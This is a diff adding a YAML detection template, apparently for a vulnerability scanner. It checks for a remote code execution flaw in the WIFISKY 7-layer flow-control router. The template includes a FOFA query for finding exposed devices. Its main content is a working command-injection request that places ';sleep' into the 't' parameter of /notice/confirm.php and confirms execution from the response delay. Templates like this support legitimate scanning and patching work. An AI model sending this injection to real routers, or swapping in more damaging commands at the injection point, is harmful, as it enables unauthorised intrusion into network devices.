@@ -1,0 +1,20 @@
+id: poc-yaml-WIFISKY-7-story-flow-control-router-confirm-rce
+info:
+  name: WIFISKY-7层流控路由器 confirm 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 7层流控路由器
+  fofa: title="WIFISKY 7层流控路由器"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(title,"WIFISKY 7层流控路由器")
+- method: GET
+  path: /notice/confirm.php?t=;sleep%20{{.t1}}
+  expression: "status_code == 200 && \nbody == \"\" &&\nduration > t1 &&\nduration\
+    \ < t2\n"
+transport: http
